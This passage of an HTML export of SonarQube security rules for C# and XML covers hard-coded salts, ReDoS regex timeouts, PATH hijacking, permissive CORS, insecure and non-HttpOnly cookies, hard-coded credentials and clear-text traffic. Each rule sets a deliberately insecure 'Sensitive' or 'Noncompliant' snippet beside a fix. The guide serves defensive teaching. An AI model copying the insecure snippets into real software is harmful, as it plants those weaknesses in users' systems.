<p>With short salts, the probability of a collision between two users&#39; passwords and salts couple might be low depending on the salt size. The shorter
the salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code contains examples of hard-coded salts.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Security.Cryptography;

public static void hash(string password)
{
    var salt &#61; Encoding.UTF8.GetBytes(&#34;salty&#34;);
    var hashed &#61; new Rfc2898DeriveBytes(password, salt); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Security.Cryptography;

public static void hash(string password)
{
    var hashed &#61; new Rfc2898DeriveBytes(password, 16);
}
</pre>
<h3>How does this work?</h3>
<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that
provides the required security level. It uses a salt length of at least 16 bytes (128 bits), as recommended by industry standards.</p>
<p>In the case of the code sample, the class automatically takes care of generating a secure salt if none is specified.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP</a> Top 10:2021 A02:2021 - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP</a> - Top 10 2017 - A03:2017 - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/759" rel="nofollow">CWE</a> - CWE-759: Use of a One-Way Hash without a Salt </li><li> <a href="https://cwe.mitre.org/data/definitions/760" rel="nofollow">CWE</a> - CWE-760: Use of a One-Way Hash with a Predictable Salt </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S6444">
              csharpsquid:S6444
            </a>
          </td>
          <td>
            <details>
              <p>Not specifying a timeout for regular expressions can lead to a Denial-of-Service attack. Pass a timeout when using
<code>System.Text.RegularExpressions</code> to process untrusted input because a malicious user might craft a value for which the evaluation lasts
excessively long.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the input passed to the regular expression is untrusted. </li><li> the regular expression contains patterns vulnerable to <a href="https://www.regular-expressions.info/catastrophic.html" rel="nofollow">catastrophic
  backtracking</a>. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> It is recommended to specify a <a href="https://learn.microsoft.com/dotnet/standard/base-types/best-practices#use-time-out-values" rel="nofollow"><code>matchTimeout</code></a> when executing a
  regular expression. </li><li> Make sure regular expressions are not vulnerable to Denial-of-Service attacks by reviewing the patterns. </li><li> Consider using a non-backtracking algorithm by specifying <a href="https://learn.microsoft.com/dotnet/api/system.text.regularexpressions.regexoptions?view&#61;net-7.0" rel="nofollow"><code>RegexOptions.NonBacktracking</code></a>. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
public void RegexPattern(string input)
{
    var emailPattern &#61; new Regex(&#34;.&#43;&#64;.&#43;&#34;, RegexOptions.None);
    var isNumber &#61; Regex.IsMatch(input, &#34;[0-9]&#43;&#34;);
    var isLetterA &#61; Regex.IsMatch(input, &#34;(a&#43;)&#43;&#34;);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void RegexPattern(string input)
{
    var emailPattern &#61; new Regex(&#34;.&#43;&#64;.&#43;&#34;, RegexOptions.None, TimeSpan.FromMilliseconds(100));
    var isNumber &#61; Regex.IsMatch(input, &#34;[0-9]&#43;&#34;, RegexOptions.None, TimeSpan.FromMilliseconds(100));
    var isLetterA &#61; Regex.IsMatch(input, &#34;(a&#43;)&#43;&#34;, RegexOptions.NonBacktracking); // .Net 7 and above
    AppDomain.CurrentDomain.SetData(&#34;REGEX_DEFAULT_MATCH_TIMEOUT&#34;, TimeSpan.FromMilliseconds(100)); // process-wide setting
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://cwe.mitre.org/data/definitions/1333" rel="nofollow">MITRE, CWE-1333</a> - Inefficient Regular Expression Complexity </li><li> <a href="https://www.regular-expressions.info/catastrophic.html" rel="nofollow">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic
  Backtracking </li><li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">owasp.org</a> - Regular expression Denial of
  Service - ReDoS </li><li> <a href="https://cwe.mitre.org/data/definitions/1333" rel="nofollow">MITRE, CWE-1333</a> - Inefficient Regular Expression Complexity </li><li> <a href="https://docs.microsoft.com/dotnet/standard/base-types/best-practices" rel="nofollow">docs.microsoft.com</a> - Best practices for regular expressions
  in .NET </li><li> <a href="https://docs.microsoft.com/dotnet/standard/base-types/backtracking-in-regular-expressions" rel="nofollow">docs.microsoft.com</a> - Backtracking in
  Regular Expressions </li><li> <a href="https://devblogs.microsoft.com/dotnet/regular-expression-improvements-in-dotnet-7/#backtracking-and-regexoptions-nonbacktracking" rel="nofollow">devblogs.microsoft.com</a> - Regular Expression Improvements in .NET 7: Backtracking (and RegexOptions.NonBacktracking) </li><li> <a href="https://docs.microsoft.com/dotnet/api/system.text.regularexpressions.regex.matchtimeout" rel="nofollow">docs.microsoft.com</a> - Regex.MatchTimeout
  Property </li><li> <a href="https://docs.microsoft.com/dotnet/api/system.text.regularexpressions.regexoptions?view&#61;net-7.0" rel="nofollow">docs.microsoft.com</a> - RegexOptions
  Enum (NonBacktracking option) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4036">
              csharpsquid:S4036
            </a>
          </td>
          <td>
            <details>
              <p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>
environment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in
<code>PATH</code> is a directory under his control.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The directories in the PATH environment variable may be defined by not trusted entities. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>
<h2>Sensitive Code Example</h2>
<pre>
Process p &#61; new Process();
p.StartInfo.FileName &#61; &#34;binary&#34;; // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
Process p &#61; new Process();
p.StartInfo.FileName &#61; &#64;&#34;C:\Apps\binary.exe&#34;; // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/426" rel="nofollow">MITRE, CWE-426</a> - Untrusted Search Path </li><li> <a href="https://cwe.mitre.org/data/definitions/427" rel="nofollow">MITRE, CWE-427</a> - Uncontrolled Search Path Element </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5122">
              csharpsquid:S5122
            </a>
          </td>
          <td>
            <details>
              <p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-0269" rel="nofollow">CVE-2018-0269</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-14460" rel="nofollow">CVE-2017-14460</a> </li></ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">Same origin policy</a> in browsers prevents, by default and for
security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="nofollow">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li><li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li><li> Your access control policy is dynamically defined by a user-controlled input like <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin" rel="nofollow"><code>origin</code></a> header. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li><li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li></ul>
<h2>Sensitive Code Example</h2>
<p>ASP.NET Core MVC:</p>
<pre>
[HttpGet]
public string Get()
{
    Response.Headers.Add(&#34;Access-Control-Allow-Origin&#34;, &#34;*&#34;); // Sensitive
    Response.Headers.Add(HeaderNames.AccessControlAllowOrigin, &#34;*&#34;); // Sensitive
}
</pre>
<pre>
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options &#61;&gt;
    {
        options.AddDefaultPolicy(builder &#61;&gt;
        {
            builder.WithOrigins(&#34;*&#34;); // Sensitive
        });

        options.AddPolicy(name: &#34;EnableAllPolicy&#34;, builder &#61;&gt;
        {
            builder.WithOrigins(&#34;*&#34;); // Sensitive
        });

        options.AddPolicy(name: &#34;OtherPolicy&#34;, builder &#61;&gt;
        {
            builder.AllowAnyOrigin(); // Sensitive
        });
    });

    services.AddControllers();
}
</pre>
<p>ASP.NET MVC:</p>
<pre>
public class HomeController : ApiController
{
    public HttpResponseMessage Get()
    {
        var response &#61; HttpContext.Current.Response;

        response.Headers.Add(&#34;Access-Control-Allow-Origin&#34;, &#34;*&#34;); // Sensitive
        response.Headers.Add(HeaderNames.AccessControlAllowOrigin, &#34;*&#34;); // Sensitive
        response.AppendHeader(HeaderNames.AccessControlAllowOrigin, &#34;*&#34;); // Sensitive
    }
}
</pre>
<pre>
[EnableCors(origins: &#34;*&#34;, headers: &#34;*&#34;, methods: &#34;GET&#34;)] // Sensitive
public HttpResponseMessage Get() &#61;&gt; new HttpResponseMessage()
{
    Content &#61; new StringContent(&#34;content&#34;)
};
</pre>
<p>User-controlled origin:</p>
<pre>
String origin &#61; Request.Headers[&#34;Origin&#34;];
Response.Headers.Add(&#34;Access-Control-Allow-Origin&#34;, origin); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>ASP.NET Core MVC:</p>
<pre>
[HttpGet]
public string Get()
{
    Response.Headers.Add(&#34;Access-Control-Allow-Origin&#34;, &#34;https://trustedwebsite.com&#34;); // Safe
    Response.Headers.Add(HeaderNames.AccessControlAllowOrigin, &#34;https://trustedwebsite.com&#34;); // Safe
}
</pre>
<pre>
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options &#61;&gt;
    {
        options.AddDefaultPolicy(builder &#61;&gt;
        {
            builder.WithOrigins(&#34;https://trustedwebsite.com&#34;, &#34;https://anothertrustedwebsite.com&#34;); // Safe
        });

        options.AddPolicy(name: &#34;EnableAllPolicy&#34;, builder &#61;&gt;
        {
            builder.WithOrigins(&#34;https://trustedwebsite.com&#34;); // Safe
        });
    });

    services.AddControllers();
}
</pre>
<p>ASP.Net MVC:</p>
<pre>
public class HomeController : ApiController
{
    public HttpResponseMessage Get()
    {
        var response &#61; HttpContext.Current.Response;

        response.Headers.Add(&#34;Access-Control-Allow-Origin&#34;, &#34;https://trustedwebsite.com&#34;);
        response.Headers.Add(HeaderNames.AccessControlAllowOrigin, &#34;https://trustedwebsite.com&#34;);
        response.AppendHeader(HeaderNames.AccessControlAllowOrigin, &#34;https://trustedwebsite.com&#34;);
    }
}
</pre>
<pre>
[EnableCors(origins: &#34;https://trustedwebsite.com&#34;, headers: &#34;*&#34;, methods: &#34;GET&#34;)]
public HttpResponseMessage Get() &#61;&gt; new HttpResponseMessage()
{
    Content &#61; new StringContent(&#34;content&#34;)
};
</pre>
<p>User-controlled origin validated with an allow-list:</p>
<pre>
String origin &#61; Request.Headers[&#34;Origin&#34;];

if (trustedOrigins.Contains(origin))
{
    Response.Headers.Add(&#34;Access-Control-Allow-Origin&#34;, origin);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="nofollow">developer.mozilla.org</a> - CORS </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">developer.mozilla.org</a> - Same origin policy </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing" rel="nofollow">OWASP HTML5 Security
  Cheat Sheet</a> - Cross Origin Resource Sharing </li><li> <a href="https://cwe.mitre.org/data/definitions/346" rel="nofollow">MITRE, CWE-346</a> - Origin Validation Error </li><li> <a href="https://cwe.mitre.org/data/definitions/942" rel="nofollow">MITRE, CWE-942</a> - Overly Permissive Cross-domain Whitelist </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2092">
              csharpsquid:S2092
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP
request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li><li> it’s not sure that the website contains <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content" rel="nofollow">mixed content</a> or not
  (ie HTTPS everywhere or not) </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour
  when creating cookies. </li><li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li></ul>
<h2>Sensitive Code Example</h2>
<p>When the <code>HttpCookie.Secure</code> property is set to <code>false</code> then the cookie will be send during an unencrypted HTTP request:</p>
<pre>
HttpCookie myCookie &#61; new HttpCookie(&#34;Sensitive cookie&#34;);
myCookie.Secure &#61; false; //  Sensitive: a security-sensitive cookie is created with the secure flag set to false
</pre>
<p>The <a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.httpcookie.secure?view&#61;netframework-4.8" rel="nofollow">default value</a> of
<code>Secure</code> flag is <code>false</code>, unless overwritten by an application’s configuration file:</p>
<pre>
HttpCookie myCookie &#61; new HttpCookie(&#34;Sensitive cookie&#34;);
//  Sensitive: a security-sensitive cookie is created with the secure flag not defined (by default set to false)
</pre>
<h2>Compliant Solution</h2>
<p>Set the <code>HttpCookie.Secure</code> property to <code>true</code>:</p>
<pre>
HttpCookie myCookie &#61; new HttpCookie(&#34;Sensitive cookie&#34;);
myCookie.Secure &#61; true; // Compliant
</pre>
<p>Or change the default flag values for the whole application by editing the <a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms228262%28v&#61;vs.100%29" rel="nofollow">Web.config configuration file</a>:</p>
<pre>
&lt;httpCookies httpOnlyCookies&#61;&#34;true&#34; requireSSL&#61;&#34;true&#34; /&gt;
</pre>
<ul><li> the <code>requireSSL</code> attribute corresponds programmatically to the <code>Secure</code> field. </li><li> the <code>httpOnlyCookies</code> attribute corresponds programmatically to the <code>httpOnly</code> field. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://cwe.mitre.org/data/definitions/315" rel="nofollow">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li><li> <a href="https://cwe.mitre.org/data/definitions/614" rel="nofollow">MITRE, CWE-614</a> - Sensitive Cookie in HTTPS Session Without &#39;Secure&#39; Attribute </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S3355">
              xml:S3355
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Every filter defined in <code>web.xml</code> file should be used in a <code>&lt;filter-mapping&gt;</code> element. Otherwise such filters are not
invoked.</p>
<h3>Noncompliant code example</h3>
<pre>
  &lt;filter&gt;
     &lt;filter-name&gt;DefinedNotUsed&lt;/filter-name&gt;
     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;
  &lt;/filter&gt;
</pre>
<h3>Compliant solution</h3>
<pre>
  &lt;filter&gt;
     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;
     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;
  &lt;/filter&gt;

  &lt;filter-mapping&gt;
     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;
     &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
  &lt;/filter-mapping&gt;
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S2068">
              xml:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://docs.spring.io/spring-social-twitter/docs/1.1.0.RELEASE/reference/htmlsingle/" rel="nofollow">Spring-social-twitter</a> secrets can be stored
inside a xml file:</p>
<pre>
&lt;?xml version&#61;&#34;1.0&#34; encoding&#61;&#34;UTF-8&#34;?&gt;
&lt;beans xmlns&#61;&#34;http://www.springframework.org/schema/beans&#34;
    xmlns:xsi&#61;&#34;http://www.w3.org/2001/XMLSchema-instance&#34;
    xsi:schemaLocation&#61;&#34;
        http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&#34;&gt;

    &lt;bean id&#61;&#34;connectionFactoryLocator&#34; class&#61;&#34;org.springframework.social.connect.support.ConnectionFactoryRegistry&#34;&gt;
      &lt;property name&#61;&#34;connectionFactories&#34;&gt;
          &lt;list&gt;
              &lt;bean class&#61;&#34;org.springframework.social.twitter.connect.TwitterConnectionFactory&#34;&gt;
                  &lt;constructor-arg value&#61;&#34;username&#34; /&gt;
                  &lt;constructor-arg value&#61;&#34;very-secret-password&#34; /&gt;   &lt;!-- Sensitive --&gt;
              &lt;/bean&gt;
          &lt;/list&gt;
      &lt;/property&gt;
  &lt;/bean&gt;
&lt;/beans&gt;
</pre>
<h2>Compliant Solution</h2>
<p>In <a href="https://docs.spring.io/spring-social-twitter/docs/1.1.0.RELEASE/reference/htmlsingle/" rel="nofollow">spring social twitter</a>, retrieve secrets from
environment variables:</p>
<pre>
&#64;Configuration
public class SocialConfig implements SocialConfigurer {

    &#64;Override
    public void addConnectionFactories(ConnectionFactoryConfigurer cfConfig, Environment env) {
        cfConfig.addConnectionFactory(new TwitterConnectionFactory(
            env.getProperty(&#34;twitter.consumerKey&#34;),
            env.getProperty(&#34;twitter.consumerSecret&#34;)));  &lt;!-- Compliant --&gt;
    }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S5332">
              xml:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> Your application renders web pages with a relaxed mixed content policy. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li><li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li></ul>  </li><li> Enable encryption of cloud components communications whenever it is possible. </li><li> Configure your application to block mixed content when rendering web pages. </li><li> If available, enforce OS-level deactivation of all clear-text traffic. </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
&lt;application
    android:usesCleartextTraffic&#61;&#34;true&#34;&gt; &lt;!-- Sensitive --&gt;
&lt;/application&gt;
</pre>
<p>For versions older than Android 9 (API level 28) <code>android:usesCleartextTraffic</code> is implicitely set to <code>true</code>.</p>
<pre>
&lt;application&gt; &lt;!-- Sensitive --&gt;
&lt;/application&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;application
    android:usesCleartextTraffic&#61;&#34;false&#34;&gt;
&lt;/application&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li><li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li><li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html" rel="nofollow">AWS
  Documentation</a> - Stream Encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S3330">
              xml:S3330
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li><li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /
  sensitive-security cookies. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
&lt;session-config&gt;
 &lt;cookie-config&gt;
  &lt;http-only&gt;false&lt;/http-only&gt; &lt;!-- Sensitive --&gt;
 &lt;/cookie-config&gt;
&lt;/session-config&gt;

&lt;session-config&gt;
